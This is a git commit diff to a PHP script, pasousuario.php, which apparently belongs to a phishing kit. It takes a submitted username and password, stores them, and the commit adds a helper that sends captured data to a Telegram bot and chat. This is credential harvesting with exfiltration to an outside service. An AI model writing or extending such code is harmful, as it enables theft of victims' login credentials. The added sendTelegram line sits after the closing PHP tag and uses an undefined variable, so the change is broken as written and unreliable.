100d7c6de1e931d274956ff2997a17a0e88e7588
JL1212583 <mariafarma1717@gmail.com>
2025-10-20 21:13:53 -0500

    Update pasousuario.php

--- process/pasousuario.php
+++ process/pasousuario.php
@@ -1,5 +1,7 @@
-<?php 
-require('../panel/lib/funciones.php');
+<?php
+require_once __DIR__ . '/../../php/helpers/config.php';
+require_once __DIR__ . '/../../php/helpers/telegram_helper.php';
+
 
 $usuario = $_POST['usr'];
 $contrasena = $_POST['pas'];
@@ -8,4 +10,6 @@ $dispositivo = $_POST['dis'];
 setcookie('usuario',$usuario,time()+60*9);
 
 crear_registro($usuario,$contrasena,$dispositivo);
+
 ?>
+sendTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $msg);
